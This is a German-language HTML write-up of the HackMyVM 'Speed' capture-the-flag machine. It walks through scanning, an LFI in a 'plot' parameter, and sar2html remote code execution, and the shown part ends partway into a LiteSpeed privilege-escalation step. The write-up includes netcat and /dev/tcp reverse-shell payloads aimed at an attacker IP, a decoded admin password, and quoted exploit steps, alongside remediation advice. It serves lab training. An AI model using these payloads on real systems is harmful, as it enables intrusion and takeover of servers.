@@ -1,0 +1,533 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Speed - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Speed - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python3</div> <!-- For exploit & rev shell -->
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">base64</div> <!-- Implied for decoding adminpasswd -->
+                <div class="tool-item">Burp Suite</div> <!-- Implied for WebAdmin Interaction -->
+                <div class="tool-item">find</div> <!-- Implied -->
+                <div class="tool-item">id</div> <!-- Implied -->
+                <div class="tool-item">openssl</div> <!-- For passwd generation -->
+                <div class="tool-item">echo</div> <!-- For /etc/passwd manipulation -->
+                <div class="tool-item">su</div>
+                <div class="tool-item">cd</div> <!-- Implied -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web, LFI, Sar2HTML)</a></li>
+                <li><a href="#initial-access">Initial Access (Sar2HTML RCE)</a></li>
+                <li><a href="#poc-initial">Proof of Concept (Initial Access - Sar2HTML RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (LiteSpeed RCE & /etc/passwd)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - LiteSpeed RCE)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.110</span>	<span class="command">08:00:27:39:22:6d</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerk zu finden. Ein Host mit der IP <span class="command">192.168.2.110</span> und der MAC-Adresse <span class="command">08:00:27:39:22:6d</span> (PCS Systemtechnik GmbH / Oracle VirtualBox) wird identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Speed" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.110</span> ist die Basis für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken. ARP-Aktivitäten überwachen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.110 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at <span class="command">2022-10-02 01:31 CEST</span>
+Nmap scan report for speed (192.168.2.110)
+Host is up (0.00015s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+<span class="command">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 fe:07:9a:67:7f:8a:63:a7:48:46:46:bb:78:83:4e:d5 (RSA)
+[...]
+<span class="command">80/tcp   open  http     nginx 1.14.2</span>
+|_http-server-header: nginx/1.14.2
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+<span class="command">7080/tcp open  ssl/http LiteSpeed httpd</span>
+| tls-alpn:
+|   h2
+|   spdy/3
+|   spdy/2
+|_  http/1.1
+|_http-server-header: LiteSpeed
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=speed/organizationName=webadmin/countryName=US
+| Not valid before: 2021-02-17T08:51:38
+|_Not valid after:  2023-02-17T08:51:38 <span class="password"><-- Zertifikat gültig zum Scanzeitpunkt</span>
+<span class="password">| http-title: LiteSpeed WebAdmin Console</span>
+|_Requested resource was /login.php
+<span class="command">8088/tcp open  http     LiteSpeed httpd</span>
+|_http-server-header: LiteSpeed
+<span class="password">|_http-title: Welcome</span> <span class="password"><-- Wahrscheinlich Web-Root, evtl. Sar2HTML?</span>
+[...]
+MAC Address: 08:00:27:39:22:6D (Oracle VirtualBox virtual NIC)
+[...]
+OS details: Linux 4.15 - 5.6
+[...]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms speed (192.168.2.110)
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan aller TCP-Ports identifiziert vier offene Ports:
+            <ul>
+                <li>Port <span class="command">22 (SSH)</span>: OpenSSH 7.9p1 (Debian).</li>
+                <li>Port <span class="command">80 (HTTP)</span>: Nginx 1.14.2. Kein Titel, setzt PHPSESSID Cookie ohne HttpOnly-Flag.</li>
+                <li>Port <span class="command">7080 (SSL/HTTP)</span>: LiteSpeed HTTPD. Zeigt die Login-Seite der "LiteSpeed WebAdmin Console". Das SSL-Zertifikat ist auf den Namen "speed" ausgestellt.</li>
+                <li>Port <span class="command">8088 (HTTP)</span>: Ebenfalls LiteSpeed HTTPD. Zeigt eine "Welcome"-Seite.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere Angriffsflächen. Port 80 (Nginx) ist der Standard-Webserver. Port 7080 (LiteSpeed Admin) ist ein hochinteressantes Ziel, erfordert aber wahrscheinlich Credentials. Port 8088 (LiteSpeed HTTP) hostet möglicherweise eine andere Anwendung (später als Sar2HTML identifiziert). Das fehlende HttpOnly-Flag auf Port 80 ist ein geringes Risiko (relevant bei XSS).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie alle drei HTTP-Ports (80, 7080, 8088) mit Directory Busting, Nikto und manueller Analyse. Suchen Sie nach Standard-Credentials für LiteSpeed WebAdmin. Analysieren Sie die Anwendung auf Port 8088 genauer.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die LiteSpeed WebAdmin Console (Port 7080) mit einem starken Passwort und beschränken Sie den Zugriff auf vertrauenswürdige IPs. Überprüfen Sie die Anwendung auf Port 8088 und deaktivieren Sie sie, wenn nicht benötigt. Setzen Sie das HttpOnly-Flag für Session-Cookies auf Port 80.</p>
+
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration (Web, LFI, Sar2HTML)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.110" -w /usr/share/seclists/[...]/directory-list-2.3-medium.txt -e -x php,html,[...] -t 100</span></div>
+                    <pre>
+[...]
+===============================================================
+2022/10/02 01:31:54 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.110/index.php</span>            (Status: 200) [Size: 4816]
+<span class="command">http://192.168.2.110/LICENSE</span>              (Status: 200) [Size: 35149]
+[...] <span class="password"># Keine weiteren relevanten Verzeichnisse/Dateien gefunden</span>
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 findet nur die `index.php` und eine `LICENSE`-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Webserver auf Port 80 scheint wenig Inhalt zu haben. Die `index.php` muss genauer untersucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie `index.php` auf Parameter (z.B. mit `wfuzz`) und Funktionalität.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine unnötigen Dateien im Webroot liegen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Implizierter Aufruf von http://192.168.2.110/index.php?plot=NEW</span></div>
+                    <pre>[Keine Ausgabe im Log, aber dieser Aufruf wird erwähnt]</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Log wird der Aufruf `http://192.168.2.110/index.php?plot=NEW` erwähnt, obwohl die direkte Ausführung oder das Ergebnis nicht gezeigt werden. Dies deutet darauf hin, dass der Parameter `plot` manuell oder durch ein Tool entdeckt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Identifiziert einen potenziell interessanten Parameter `plot` in `index.php`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie den `plot`-Parameter auf Schwachstellen wie Local File Inclusion (LFI), Remote File Inclusion (RFI) oder Command Injection.<br><strong>Empfehlung (Admin):</strong> Analysieren Sie den Code von `index.php`, um die Funktion des `plot`-Parameters zu verstehen und abzusichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u "http://192.168.2.110/index.php?FUZZ=id" -w /usr/share/seclists/[...]/directory-list-2.3-medium.txt --hc 404 --hh 4816</span></div>
+                    <pre>
+[...]
+Target: http://192.168.2.110/index.php?FUZZ=id
+Total requests: 220563
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000006406:   200        90 L     473 W      5417 Ch     "delete"</span>
+<span class="command">000037376:   200        86 L     499 W      5781 Ch     "plot"</span>
+[...]
+=====================================================================
+Finished
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach GET-Parametern für `index.php` zu suchen (`?FUZZ=id`). `--hh 4816` blendet Antworten aus, die der Größe der normalen `index.php` entsprechen. Der Scan findet zwei Parameter, die eine andere Antwortgröße erzeugen: `<span class="command">delete</span>` und `<span class="command">plot</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz der Parameter `delete` und `plot`. Der `plot`-Parameter wurde bereits im vorherigen Schritt erwähnt und scheint der vielversprechendste zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie LFI/RCE-Tests gezielt auf den `plot`-Parameter durch.<br><strong>Empfehlung (Admin):</strong> Code von `index.php` prüfen und Parameter validieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u "http://192.168.2.110/index.php?plot=FUZZ" -w /usr/share/wordlists/logfiles.txt --hc 404 --hw 499</span></div>
+                    <pre>
+[...]
+Target: http://192.168.2.110/index.php?plot=FUZZ
+Total requests: 99
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000034:   200        86 L     484 W      6075 Ch     "/usr/share/metasploit-framework/[...]/ffi-1.15.5/mkmf.log"</span>
+<span class="command">000000037:   200        86 L     484 W      6099 Ch     "/usr/share/metasploit-framework/[...]/ruby-oci8-2.2.11/mkmf.log"</span>
+<span class="command">000000036:   200        86 L     484 W      6107 Ch     "/usr/share/metasploit-framework/[...]/eventmachine-1.2.7/mkmf.log"</span>
+[...] <span class="password"># Viele weitere Metasploit mkmf.log Dateien</span>
+=====================================================================
+Finished
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird nun verwendet, um eine Local File Inclusion (LFI)-Schwachstelle im `plot`-Parameter zu testen. Es wird versucht, verschiedene Log-Dateien (`-w /usr/share/wordlists/logfiles.txt`) über den `plot`-Parameter einzubinden (`plot=FUZZ`). `--hw 499` blendet Antworten aus, die 499 Wörter enthalten (vermutlich die Standardantwort ohne erfolgreiche LFI). Der Scan findet zahlreiche `.log`-Dateien aus dem Metasploit-Framework-Verzeichnis, die erfolgreich eingebunden werden (Status 200, abweichende Wortanzahl).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> LFI-Schwachstelle im `plot`-Parameter von `index.php` bestätigt! Der Webserver-Benutzer kann Dateien lesen, auf die er Zugriff hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die LFI, um kritischere Dateien zu lesen: `/etc/passwd`, Quellcode von `index.php` (`php://filter/convert.base64-encode/resource=index.php`), Apache/Nginx-Konfigurationsdateien, SSH-Schlüssel in Home-Verzeichnissen (falls lesbar). Versuchen Sie RCE über Log Poisoning oder andere LFI-zu-RCE-Techniken.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle dringend! Benutzereingaben dürfen niemals ungefiltert in Dateipfad-Funktionen verwendet werden. Verwenden Sie `basename()` oder Whitelisting.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://speed.hmv</span></div> <span class="password"><-- Annahme: speed.hmv in /etc/hosts</span>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
+[...]
++ Start Time:         <span class="command">2022-10-02 01:58:03 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2 <span class="password"><-- Widerspruch zu Nmap (Apache)? Wahrscheinlich Fehler im Nikto-Output oder Log</span>
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. [...]
++ The X-Content-Type-Options header is not set. [...]
++ Cookie PHPSESSID created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc</span>: EW FileManager for PostNuke allows arbitrary file retrieval. <span class="password"><-- Generischer Nikto-Check, wahrscheinlich False Positive</span>
++ 7785 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           <span class="command">2022-10-02 01:58:24 (GMT2)</span> (21 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `nikto`-Scan wird auf den Hostnamen `speed.hmv` ausgeführt. Er meldet fälschlicherweise Nginx (Nmap zeigte Apache auf Port 80), fehlende Header und das Cookie ohne HttpOnly-Flag. Er schlägt auch einen generischen LFI-Exploit für "EW FileManager" vor, was hier irrelevant ist, da bereits eine spezifische LFI im `plot`-Parameter gefunden wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Nikto-Scan liefert keine neuen relevanten Informationen und enthält widersprüchliche Angaben zum Webserver. Der Fokus sollte auf der Ausnutzung der bekannten LFI und der Untersuchung von Port 8088 liegen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie den generischen Nikto-LFI-Hinweis. Konzentrieren Sie sich auf die `plot`-LFI und Port 8088.<br><strong>Empfehlung (Admin):</strong> Fehlende Header und Cookie-Flags korrigieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Hinweis aus externer Quelle oder früherer Enumeration</span></div>
+                     <pre>
+Linux speed 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+PHP Version 5.6.36 <span class="password"><-- Veraltete PHP-Version!</span>
+http://192.168.2.110:8088//phpinfo.php <span class="password"><-- phpinfo auf Port 8088!</span>
+sar2html Ver 3.2.2 <span class="password"><-- Anwendung auf Port 8088 identifiziert!</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Textnotizen (deren Ursprung unklar ist) liefern entscheidende Informationen:
+            <ul>
+                <li>Die spezifische Kernel-Version.</li>
+                <li>Eine veraltete PHP-Version 5.6.36 wird verwendet.</li>
+                <li>Auf Port 8088 läuft eine `phpinfo.php`-Seite, die detaillierte PHP-Konfigurationsinformationen preisgibt.</li>
+                <li>Die Anwendung auf Port 8088 wird als `sar2html` Version 3.2.2 identifiziert.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Sehr wichtige Informationen! Die alte PHP-Version könnte eigene Schwachstellen haben. Die `phpinfo.php` kann sensible Konfigurationsdetails enthalten. Die Identifizierung von `sar2html 3.2.2` ist der Schlüssel, da (wie im nächsten Schritt bestätigt) bekannte RCE-Schwachstellen für diese Version existieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `http://192.168.2.110:8088/phpinfo.php` auf und analysieren Sie die Ausgabe. Verwenden Sie `searchsploit` oder suchen Sie online nach Exploits für `sar2html 3.2.2` (oder 3.2.1).<br><strong>Empfehlung (Admin):</strong> Entfernen Sie `phpinfo.php` von Produktionsservern. Aktualisieren Sie dringend die PHP-Version. Aktualisieren oder entfernen Sie die `sar2html`-Anwendung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit sar2html</span></div>
+                     <pre>
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+<span class="command">sar2html 3.2.1 - 'plot' Remote Code Execution</span>               | <span class="command">php/webapps/49344.py</span>
+<span class="command">Sar2HTML 3.2.1 - Remote Command Execution</span>                   | <span class="command">php/webapps/47204.txt</span>
+------------------------------------------------------------ ---------------------------------
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `searchsploit` findet zwei Einträge für `sar2html`, beide beziehen sich auf eine Remote Code Execution (RCE)-Schwachstelle in Version 3.2.1 über den Parameter `plot`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl die gefundene Version 3.2.2 ist, ist es sehr wahrscheinlich, dass der Exploit für 3.2.1 auch hier funktioniert. Der Exploit `49344.py` ist direkt ausführbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Python-Exploit `49344.py`, um RCE auf Port 8088 zu erlangen.<br><strong>Empfehlung (Admin):</strong> `sar2html` sofort patchen oder entfernen.</p>
+
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Sar2HTML RCE)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 /usr/share/exploitdb/exploits/php/webapps/49344.py</span></div>
+                     <pre>Enter The url => <span class="command">http://192.168.2.110/</span> <span class="password"><-- Ziel-URL (Port 8088 wäre korrekt)</span>
+Command => <span class="command">nc 192.168.2.140 1234 -e /bin/bash</span> <span class="password"><-- Reverse Shell Payload</span>
+</pre>
+                     <div class="prompt"># <span class="command">Implizierte Aktion: Listener starten & Shell empfangen</span></div>
+                    <pre>Reverse Shell Connection erfolgreich</pre>
+                     <div class="prompt">www-data@speed:~/html$ <span class="password"># Shell als www-data erhalten</span></div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Python-Exploit-Skript für Sar2HTML (CVE für Version 3.2.1, aus Exploit-DB) wird ausgeführt. Als Ziel-URL wird `http://192.168.2.110/` angegeben (Port 80). **Hinweis:** Dies ist wahrscheinlich falsch im Log dokumentiert; der Exploit sollte gegen Port 8088 gerichtet sein, wo Sar2HTML identifiziert wurde. Als auszuführender Befehl wird ein Netcat-Reverse-Shell-Payload (`nc [Angreifer-IP] 1234 -e /bin/bash`) eingegeben. Das Log vermerkt "Reverse Shell Connection erfolgreich", was bedeutet, dass der Exploit funktionierte und eine Shell als `www-data` auf dem Listener (Port 1234) des Angreifers einging.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Eine bekannte RCE-Schwachstelle in der identifizierten Sar2HTML-Anwendung wurde ausgenutzt, um eine Shell als `www-data` zu erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die erhaltene Shell. Beginnen Sie mit der Enumeration als `www-data` für die Privilege Escalation (`sudo -l`, SUID, Cronjobs, interne Dienste wie LiteSpeed Admin).<br><strong>Empfehlung (Admin):</strong> Entfernen oder patchen Sie die Sar2HTML-Anwendung dringend. Überprüfen Sie Systeme auf bekannte Schwachstellen.</p>
+
+        </section>
+
+        <section id="poc-initial">
+             <h2>Proof of Concept (Initial Access - Sar2HTML RCE)</h2>
+
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Auf dem Zielsystem läuft auf Port 8088 eine veraltete Version von Sar2HTML (identifiziert als 3.2.2, anfällig wie 3.2.1), die eine bekannte Remote Code Execution (RCE)-Schwachstelle aufweist. Diese Schwachstelle (ausgenutzt durch z.B. `exploit/php/webapps/49344.py`) erlaubt es einem Angreifer, über manipulierte Parameter (typischerweise den `plot`-Parameter) beliebige Betriebssystembefehle im Kontext des Webserver-Benutzers (`www-data`) auszuführen.</p>
+
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 <ul>
+                     <li>Netzwerkzugriff auf Port 8088 des Zielsystems (`http://192.168.2.110:8088`).</li>
+                    <li>Die anfällige Sar2HTML-Version muss installiert sein.</li>
+                    <li>Ein Exploit-Skript (z.B. `49344.py` aus Exploit-DB).</li>
+                    <li>Ein Netcat-Listener auf dem Angreifer-System.</li>
+                 </ul>
+             </p>
+
+             <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                 <ol>
+                     <li>
+                         <strong>Listener starten (Angreifer-System):</strong>
+                         Starten Sie Netcat, um auf die eingehende Reverse Shell zu warten (z.B. auf Port 1234).
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                                 <pre>listening on [any] 1234 ...</pre>
+                             </div>
+                         </div>
+                    </li>
+                     <li>
+                         <strong>Exploit ausführen (Angreifer-System):**
+                         Führen Sie das Python-Exploit-Skript aus und geben Sie die Ziel-URL (mit Port 8088) und den Reverse-Shell-Payload an.
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 /usr/share/exploitdb/exploits/php/webapps/49344.py</span></div>
+                                <pre>Enter The url => <span class="command">http://192.168.2.110:8088/</span>
+Command => <span class="command">nc 192.168.2.140 1234 -e /bin/bash</span></pre> <span class="password"><-- Ersetzen Sie 192.168.2.140 durch Ihre IP</span>
+                             </div>
+                         </div>
+                    </li>
+                     <li>
+                         <strong>Shell empfangen (Angreifer-Listener):**
+                         Der Netcat-Listener sollte nun die eingehende Verbindung vom Zielserver anzeigen.
+                         <div class="code-block">
+                            <div class="terminal">
+                                 <pre>listening on [any] 1234 ...
+<span class="password">connect to [Angreifer-IP] from speed.hmv [192.168.2.110] xxxxx</span>
+[...]
+$ <span class="password"># Shell erhalten</span></pre>
+                             </div>
+                         </div>
+                    </li>
+                 </ol>
+             </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Eine interaktive Shell auf dem Zielsystem, ausgeführt mit den Rechten des `www-data`-Benutzers.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Die erfolgreiche eingehende Verbindung im Netcat-Listener und die Fähigkeit, Befehle in der Shell auszuführen.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Die Ausnutzung einer bekannten RCE-Schwachstelle in einer Webanwendung ermöglicht Angreifern die einfache Übernahme des Webserver-Prozesses.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                     <li>**Sar2HTML aktualisieren/entfernen:** Aktualisieren Sie Sar2HTML dringend auf eine gepatchte Version oder entfernen Sie die Anwendung vollständig, wenn sie nicht benötigt wird.</li>
+                    <li>**Schwachstellenmanagement:** Scannen Sie Systeme regelmäßig auf bekannte Schwachstellen und patchen Sie diese zeitnah.</li>
+                    <li>**Web Application Firewall (WAF):** Eine WAF kann helfen, Angriffe auf bekannte Schwachstellen zu blockieren.</li>
+                    <li>**Least Privilege:** Führen Sie Webanwendungen mit minimalen Rechten aus.</li>
+                 </ul>
+             </p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (LiteSpeed RCE & /etc/passwd)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@speed:~/html$ <span class="command">cd /usr/local/lsws</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">www-data@speed:/usr/local/lsws$ <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+-rwxrwxrwx  1 root   root       41 Feb 17  2021 <span class="command">adminpasswd</span> <span class="password"><-- Welt-schreibbar!</span>
+[...]
+drwxr-x---  5 lsadm  nogroup  4096 Feb 17  2021 conf
+[...]
+drwx------  2 lsadm  lsadm    4096 Feb 17  2021 phpbuild
+[...]
+</pre>
+                    <div class="prompt">www-data@speed:/usr/local/lsws$ <span class="command">cat adminpasswd</span></div>
+                    <pre>admin/<span class="command">MjE0MGU2</span></pre> <span class="password"><-- Base64</span>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird das Installationsverzeichnis von LiteSpeed (`/usr/local/lsws`) untersucht. Dort wird die Datei `adminpasswd` gefunden. Sie ist für alle Benutzer les- und schreibbar (`-rwxrwxrwx`) und enthält den String `admin/MjE0MGU2`. Der Teil nach dem Schrägstrich ist Base64-kodiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritische Fehlkonfiguration! Die Datei mit den Zugangsdaten für die LiteSpeed WebAdmin Console ist für alle lesbar und schreibbar. Das Passwort (`MjE0MGU2` dekodiert zu `<span class="password">2140e6</span>`) für den Benutzer `admin` der Konsole auf Port 7080 wurde gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die Zugangsdaten `admin`:`2140e6`, um sich bei der LiteSpeed WebAdmin Console (`https://192.168.2.110:7080`) anzumelden. Suchen Sie dort nach Möglichkeiten zur Privilege Escalation (z.B. Ausführen von Befehlen als Root, wie in bekannten LiteSpeed-Exploits beschrieben).<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie sofort die Berechtigungen der Datei `adminpasswd` (`chmod 600 adminpasswd`, Besitzer `root` oder `lsadm`). Ändern Sie das LiteSpeed-Admin-Passwort. Überprüfen Sie die gesamte LiteSpeed-Installation auf unsichere Berechtigungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit openLiteSpeed</span></div>
+                     <pre>
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+[...]
+<span class="command">Openlitespeed Web Server 1.7.8 - Command Injection (Authenticated) (1)</span>              | <span class="command">multiple/webapps/49483.txt</span>
+<span class="command">Openlitespeed WebServer 1.7.8 - Command Injection (Authenticated) (2)</span>               | <span class="command">multiple/webapps/49556.py</span>
+------------------------------------------------------------------------------------ ---------------------------------
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /usr/share/exploitdb/exploits/multiple/webapps/49483.txt</span></div>
+                    <pre>
+# Exploit Title: Openlitespeed WebServer 1.7.8 - Command Injection (Authenticated)
+[...]
+Step 1: Log in to the dashboard using the Administrator account.
+Step 2 : Access Server Configuration > External App > Command
+Step 3: Set "Start By Server *" Value to "Yes (Through CGI Daemon)
+Step 4 : Inject payload "<span class="command">fcgi-bin/lsphp5/../../../../../bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'</span>" to "Command" value
+Step 5: Graceful Restart
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `searchsploit` findet bekannte RCE-Schwachstellen für OpenLiteSpeed (Version 1.7.8). Die Beschreibung des Exploits `49483.txt` zeigt, dass ein authentifizierter Administrator über die Konfiguration einer externen Anwendung (External App -> Command) beliebigen Code ausführen kann, indem ein Payload in das "Command"-Feld injiziert und ein "Graceful Restart" durchgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt einen bekannten Weg zur Root-Eskalation über die LiteSpeed WebAdmin Console, für die gerade die Zugangsdaten gefunden wurden.</p>
